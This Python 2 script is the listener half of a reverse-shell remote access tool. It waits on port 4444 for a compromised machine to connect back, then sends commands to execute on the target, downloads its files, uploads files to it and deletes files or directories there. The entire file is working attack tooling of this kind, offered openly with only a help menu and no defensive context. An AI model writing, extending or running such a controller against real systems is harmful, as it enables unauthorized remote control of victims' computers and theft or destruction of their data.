#!/usr/bin/env python
import socket, json, subprocess, base64, os.path, types

# -*- coding: utf-8 -*-
# encoding=utf8

# When you want to extract content, read
# When you want to write content, write

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        self.error_messages = ["[-] No such file or directory in the target system", "[-] No such file", "[-] Invalid Command"
                               "[-] The target does not have permission to read content"]

        print("[+] Waiting for incoming connections")
        listener.listen(0)
        (self.socket_reverse_connection, host_addr) = listener.accept()
        print("[+] Connection established from " + host_addr[0])
        print("[+] 'help' for help\n")
        self.valid_commands = ["remove", "download", "upload", "clear screen", "cd"]
    def clear_terminal_screen(self):
        subprocess.check_call("clear")

    def json_send(self, data):
        json_data = json.dumps(data)
        self.socket_reverse_connection.send(json_data)

    def write(self, file_name, encoded_content):
        with open(file_name, "wb") as file_to_be_downloaded:
            content = base64.b64decode(encoded_content)
            if content in self.error_messages:
                return self.error_messages[0]
            else:
                if isinstance(content, types.DictType):
                    for item in content:
                        content = content[item]
                        file_to_be_downloaded.write(content)
                else:
                    file_to_be_downloaded.write(content)
                    return "[+] Download Successful"

    def read(self, file_name):
        with open(file_name, "rb") as file_to_upload:
            content_of_file_to_upload = file_to_upload.read()
            encoded_content = base64.b64encode(content_of_file_to_upload)
            return encoded_content

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.socket_reverse_connection.recv(1024))
                data = json.loads(json_data)
                return data
            except ValueError:
                continue

    def execute_command_remotely(self, command):
        result = ""
        self.json_send(command)

        if command[0] == "exit":
            self.socket_reverse_connection.close()
            exit()
        elif command[0] == "upload":
            result = self.json_recv()

        elif command[0] == "download":
            content_of_downloaded_file = self.json_recv()
            if content_of_downloaded_file in self.error_messages:
                result = self.error_messages[1]
            else:
                result = self.write(command[1], content_of_downloaded_file)
        else:
            result = self.json_recv()
        return result

    def run(self):
        while True:
            command = raw_input(">> ")
            if command == "help":
                print("""
The commands work based off the operating system of the target.

clear screen : To clear your terminal screen
remove [file or directory] : To remove a file or directory of the target
upload : Upload a file or directory
download : Download a directory or file from the target system
exit : To close the connection

                    """)
            elif (command == "clear screen"):
                self.clear_terminal_screen()
            else:
                command = command.split(" ")
                if (command[0] in self.valid_commands and (len(command) < 2)):
                    print("[-] Command improperly used")
                    continue
                else:
                    if command[0] == "upload":
                        if not os.path.exists(command[1]):
                            print("[-] No such file or directory in your system to upload")
                            continue
                        else:
                            content_of_file = self.read(command[1])
                            command.append(content_of_file)

                    self.result = self.execute_command_remotely(command)
                print(self.result)

listener = Listener("192.168.1.3", 4444)
listener.run()